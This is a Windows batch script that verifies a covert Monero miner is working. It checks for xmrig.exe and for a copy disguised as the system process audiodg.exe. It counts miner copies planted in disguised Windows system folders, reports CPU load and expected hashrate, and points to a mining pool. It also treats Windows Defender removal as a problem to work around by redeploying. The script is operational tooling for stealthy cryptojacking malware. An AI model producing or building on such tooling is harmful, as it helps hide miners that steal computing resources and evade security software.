@echo off
title CHECK IF MINER IS WORKING
color 0A

cls
echo ================================================================
echo  CHECKING IF MINER IS WORKING
echo ================================================================
echo.

echo [1/4] Checking for miner process...
tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I "xmrig.exe" >NUL
if %ERRORLEVEL%==0 (
    echo [SUCCESS] xmrig.exe is running!
    tasklist /FI "IMAGENAME eq xmrig.exe" /FO LIST | findstr "PID Memory"
    set FOUND=1
) else (
    echo [NOT FOUND] xmrig.exe not running as xmrig.exe
)

echo.
echo [2/4] Checking for stealth process (audiodg.exe)...
tasklist /FI "IMAGENAME eq audiodg.exe" 2>NUL | find /I "audiodg.exe" >NUL
if %ERRORLEVEL%==0 (
    echo [SUCCESS] audiodg.exe is running!
    tasklist /FI "IMAGENAME eq audiodg.exe" /FO LIST | findstr "PID Memory"
    set FOUND=1
)

echo.
echo [3/4] Checking deployed locations...
set COUNT=0
if exist "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe" (
    echo [FOUND] Location 1: WindowsUpdate
    set /A COUNT+=1
)
if exist "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\audiodg.exe" (
    echo [FOUND] Location 2: AudioSrv
    set /A COUNT+=1
)
if exist "C:\ProgramData\Microsoft\Network\Downloader\audiodg.exe" (
    echo [FOUND] Location 3: Network Downloader
    set /A COUNT+=1
)
echo Total deployed locations: %COUNT%/7

echo.
echo [4/4] Checking CPU usage...
wmic cpu get loadpercentage | findstr /V "LoadPercentage" > temp_cpu.txt
set /p CPULOAD=<temp_cpu.txt
del temp_cpu.txt
echo Current CPU usage: %CPULOAD%%%

echo.
echo ================================================================
echo  RESULTS:
echo ================================================================

if defined FOUND (
    echo.
    echo [SUCCESS] MINER IS RUNNING!
    echo.
    echo Process found: YES
    echo Deployed files: %COUNT%/7
    echo CPU usage: %CPULOAD%%%
    echo.
    echo Expected hashrate on your i5-6500:
    echo  - Safe mode (35%% CPU): ~1500-2000 H/s
    echo  - Full mode (75%% CPU): ~3500-4500 H/s
    echo.
    echo To see earnings:
    echo  1. Go to: https://moneroocean.stream
    echo  2. Click "Workers"
    echo  3. Enter your wallet address
    echo  4. Wait 2-5 minutes for it to appear
    echo.
    echo Your PC will show as: %COMPUTERNAME%
) else (
    echo.
    echo [WARNING] MINER PROCESS NOT FOUND
    echo.
    if %COUNT% GTR 0 (
        echo Files are deployed (%COUNT% locations) but process not running.
        echo.
        echo Possible causes:
        echo  1. Miner just started (wait 30 seconds)
        echo  2. Network blocking connection
        echo  3. Windows Defender killed it
        echo.
        echo Try running: START_ULTIMATE_FIXED.bat again
    ) else (
        echo Files not deployed.
        echo Run: START_ULTIMATE_FIXED.bat to deploy
    )
)

echo.
echo ================================================================
pause
